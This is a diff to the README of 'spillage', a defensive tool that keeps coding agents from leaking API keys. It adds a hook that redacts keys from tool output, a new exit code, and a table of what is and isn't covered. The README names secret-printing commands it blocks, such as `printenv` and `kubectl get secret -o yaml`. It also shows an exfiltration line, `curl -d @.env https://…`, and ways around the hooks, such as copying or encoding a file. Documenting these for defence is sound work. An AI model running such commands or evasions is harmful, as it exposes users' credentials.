@@ -51,6 +51,7 @@ Your coding agent writes down everything. Every `.env` it read, every key you pa
 The Claude Code docs say it themselves: *"Transcripts and history are not encrypted at rest. OS file permissions are the only protection. If a tool reads a `.env` file or a command prints a credential, that value is written to `projects/<project>/<session>.jsonl`."* ([source](https://code.claude.com/docs/en/claude-directory))
 
 - **Blocks it before it's sent.** `guard` stops prompts with a key in them and keeps the agent away from `.env`, private keys and `printenv`, in Claude Code, Codex and Gemini CLI. In Claude Code also as a [plugin](#install), with nothing else to install.
+- **Redacts what a tool printed.** In Claude Code, a key in the output of a command or in a file that was read is replaced with a marker before the model sees it, so it never reaches the provider or the session log.
 - **Finds what already leaked.** Reads the logs of fourteen agents and says *how* each key got there (you pasted it, a tool printed it, the model repeated it), with a link to the page where you rotate it.
 - **Cleans up.** `scrub` redacts in place without breaking the JSON your agent reads back for `--resume`.
 - **Zero dependencies, zero network.** Standard library only. Nothing leaves your machine, ever. Secrets are only ever shown masked.
@@ -106,7 +107,7 @@ Only want the [guard hooks](#guard) in Claude Code? Then there is nothing to ins
 /plugin install spillage --marketplace maximilianfeix/spillage
 ```
 
-It blocks prompts that contain a key, keeps the agent from reading `.env` files and printing secrets, and scrubs the transcript when a session ends. It runs from the plugin's own folder with the Python you already have (3.9 or newer). Scanning and scrubbing what is already in your logs needs the command line tool above; with it installed, use either the plugin or `spillage guard install`, not both.
+It blocks prompts that contain a key, keeps the agent from reading `.env` files and printing secrets, replaces a key in what a tool printed before the model sees it, and scrubs the transcript when a session ends. It runs from the plugin's own folder with the Python you already have (3.9 or newer). Scanning and scrubbing what is already in your logs needs the command line tool above; with it installed, use either the plugin or `spillage guard install`, not both.
 
 <a id="where-it-looks"></a>
 
@@ -199,7 +200,7 @@ spillage completions zsh          tab completion for zsh, bash or fish
 
 Tab completion for commands and options: add `eval "$(spillage completions zsh)"` to your `~/.zshrc` (or `bash` to `~/.bashrc`), or for fish run `spillage completions fish > ~/.config/fish/completions/spillage.fish`.
 
-The exit code is `1` when something was found and `0` when not, so it drops into cron, a shell hook or CI as is. `--exit-zero` turns that off.
+The exit code is `1` when something was found, `3` when nothing was found but some files could not be read (the report lists them, so a skipped file can't pass for a clean one), and `0` when the scan was clean, so it drops into cron, a shell hook or CI as is. `--exit-zero` turns that off.
 
 <a id="doctor"></a>
 
@@ -282,19 +283,39 @@ spillage guard status
 spillage guard uninstall
 ```
 
-Adds three hooks to **Claude Code**, **Codex CLI** and **Gemini CLI**:
+Adds three hooks to **Claude Code**, **Codex CLI** and **Gemini CLI**, and a fourth to Claude Code:
 
 | Hook | Claude Code / Codex | Gemini CLI | What it does |
 | --- | --- | --- | --- |
 | prompt | `UserPromptSubmit` | `BeforeAgent` | Blocks a prompt that contains a key, before it's sent. Put `spillage:allow` in the prompt if you really mean it. |
-| tool | `PreToolUse` | `BeforeTool` | Blocks reading `.env` files, private keys and credential files (`.npmrc`, `.aws/credentials`, `*.pem`, …) and shell commands that would print secrets: `cat .env`, `printenv`, `echo $STRIPE_SECRET_KEY`, `gh auth token`, `security find-generic-password -w`, … in Bash and in PowerShell. The reason goes back to the model, so it asks you instead. `.env.example` and friends stay readable. |
+| tool | `PreToolUse` | `BeforeTool` | Blocks reading `.env` files, private keys and credential files (`.npmrc`, `.aws/credentials`, `*.pem`, …) and shell commands that would print secrets: `cat .env`, `printenv`, `echo $STRIPE_SECRET_KEY`, `git show HEAD:.env`, `gh auth token`, `kubectl get secret -o yaml`, `security find-generic-password -w`, … in Bash and in PowerShell. The reason goes back to the model, so it asks you instead. `.env.example` and friends stay readable. |
+| tool output | `PostToolUse` (Claude Code only) | | Replaces a key in what a tool returned with `[REDACTED:github-token:dfd5fe8c9655]` before the model sees it: the output of a command, a file that was read, a page that was fetched, an MCP server's answer. Also the values from your project's `.env`. |
 | session end | `SessionEnd` | `SessionEnd` | Scrubs the transcript of the session that just ended. |
+
+The tool output hook is there for the key nobody saw coming: a `curl -v` that echoes the auth header, a config file with a token in it, a stack trace with a database URL. The model gets the marker and a note that says what was replaced, and the transcript only ever holds the marker. Tried against the real Claude Code (2.1.296): with a GitHub token in a file, `cat` and the Read tool both came back redacted, and the session file did not contain the token. Keys of low severity (a Stripe test key, a Supabase `anon` key) are left in, since those are often what the agent is supposed to work with. Fingerprints you ignored stay too.
+
+One thing it can't do: when a command fails (a non-zero exit code), Claude Code hands the hook the error text but doesn't let it replace it. spillage then tells you which kind of key it was and that it needs rotating, and the session end hook takes it out of the transcript.
 
 That last one exists because of something that came up while testing the first against the real Claude Code: **a blocked prompt still gets written into the session file.** It's never sent, but it ends up on disk as a `queue-operation` record. The session-end hook cleans that up, along with anything a tool printed that the other hook didn't catch.
 
 The config goes where each agent expects it: `~/.claude/settings.json`, `~/.codex/hooks.json`, `~/.gemini/settings.json` (or the repo's folder with `--scope project`; `--scope local` exists only for Claude Code's `settings.local.json`). Gemini's settings may contain comments; they're read fine, but not written back, and the original is kept as a backup. Your other hooks and settings are left alone, a backup is kept the first time, and a file that isn't valid JSON is refused rather than overwritten. Each hook call takes about a tenth of a second.
 
 The hooks are a guard rail, not a sandbox. They stop the ways a key usually ends up in a conversation: the agent reads `.env` to "check the config", runs `printenv` to debug, or you paste a key. An agent that is set on reading a file will find a way the hooks don't know (`cp .env notes.txt`, then read that), so they don't replace keeping keys out of the folders your agent works in, and a real sandbox if you need one.
+
+What that means per agent, and when:
+
+| A key that… | Claude Code | Codex CLI | Gemini CLI |
+| --- | --- | --- | --- |
+| is in a prompt you send | **prevented**: blocked before it's sent; the blocked prompt is still written to the transcript and scrubbed at session end | **prevented** | **prevented** (documented hook format, not tried against a real install) |
+| a known command or file read would print (`cat .env`, `printenv`, `gh auth token`, …) | **prevented** | **prevented** | **prevented** (as above) |
+| a tool prints anyway (a config file, `curl -v`, an MCP server) | **redacted** before the model sees it | **detected after**: it reached the model; `spillage` finds it, session end scrubs it | **detected after** |
+| is in the output of a failed command | **detected after**, and you're told right away which kind of key to rotate | **detected after** | **detected after** |
+| leaves without going through the conversation (`curl -d @.env https://…`, a script that uploads it) | **not covered**: that is exfiltration, not a leak into the conversation; it needs a sandbox or network rules | **not covered** | **not covered** |
+| is built at run time (`cat $(echo .env)`, a file copied first and read under another name) | **redacted** by the tool output hook if it's a known key or one of your `.env` values | **detected after** | **detected after** |
+
+When a hook itself fails (a bug in spillage, an input too deeply nested to read), it doesn't let things through: the tool call is blocked and output it can't check is withheld, with a message saying so. A prompt still goes out in that case, with a warning, so a bug can't lock you out.
+
+Detection has limits of its own: a key spelled with escapes no serializer would use (`ghp_…`), split over several strings, or encoded (base64, hex) is not found. The values from your `.env` files are found in the spellings real logs use, including JSON escapes and Go's `&` for `&`.
 
 > [!NOTE]
 > Codex runs new hooks only after you've trusted them once: open Codex and run `/hooks`. Claude Code and Codex were tested end to end with their real CLIs; Gemini CLI follows its documented hook format.
@@ -469,7 +490,7 @@ No. The key was sent to the model provider as part of the conversation when it h
 <summary><b>Does guard catch a key that shows up in a tool's output?</b></summary>
 <br>
 
-It works one step earlier. The tool hook looks at the command before it runs and blocks the ones that would print a key (`cat .env`, `printenv`, `echo $STRIPE_SECRET_KEY`), so there is no output to catch. It does not filter what a command prints: a hook that runs after the tool cannot take the output back out of the conversation. A key that comes out of a command nobody expected to print one is scrubbed from the transcript when the session ends, and `spillage watch` tells you the moment it lands.
+In Claude Code, yes. The tool hook looks at the command before it runs and blocks the ones that would print a key (`cat .env`, `printenv`, `echo $STRIPE_SECRET_KEY`). What still comes out of a command nobody expected to print one is replaced with a marker before the model sees it, see [Guard](#guard). The exception is a command that fails: Claude Code doesn't let a hook change the output of a failed command, so a `curl` that exits with an error and echoes the auth header gets through. spillage tells you to rotate that key, and it is scrubbed from the transcript when the session ends. Codex and Gemini CLI have no way to replace a tool's output yet; there the first hook, the scrub at session end and `spillage watch` are what you have.
 
 </details>
 
@@ -522,6 +543,7 @@ Yes. Cursor keeps its chats in SQLite (`state.vscdb`), spillage opens those read
 - [x] [Split huge session files across cores](https://github.com/maximilianfeix/spillage/issues/6)
 - [x] [`spillage doctor`](https://github.com/maximilianfeix/spillage/issues/64), shell completions, 100 rules
 - [x] Claude Code plugin, guard for the PowerShell tool, signed releases
+- [x] Keys in tool output are redacted before the model sees them (Claude Code)
 - [x] [PyPI release](https://pypi.org/project/spillage/)
 - [ ] [A config file, `.spillage.toml`](https://github.com/maximilianfeix/spillage/issues/76)
 - [ ] [A baseline file for CI: fail only on new secrets](https://github.com/maximilianfeix/spillage/issues/77)
